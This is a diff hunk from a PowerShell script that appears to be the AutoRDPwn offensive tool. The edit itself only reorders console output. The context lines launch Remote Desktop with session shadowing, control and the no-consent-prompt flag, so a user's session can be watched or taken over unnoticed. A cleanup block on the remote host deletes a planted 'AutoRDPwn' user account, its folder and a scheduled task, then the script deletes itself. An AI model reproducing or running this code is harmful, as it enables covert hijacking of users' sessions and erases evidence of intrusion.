@@ -486,8 +486,9 @@ function Remove-Exclusions {
         if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}
 
-if ($nogui){ Write-Host ; Write-Host $txt66 ; Write-Host ; Write-Host "mstsc /v computername /admin /shadow:$shadow /control /noconsentprompt /prompt /f" }
-else { Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt38  -ForegroundColor Red ; sleep -milliseconds 4000 }
+$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
+if ($nogui){ Write-Host $txt66 ; Write-Host ; Write-Host "mstsc /v computername /admin /shadow:$shadow /control /noconsentprompt /prompt /f" }
+else { Write-Host $txt38  -ForegroundColor Red ; sleep -milliseconds 4000 }
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
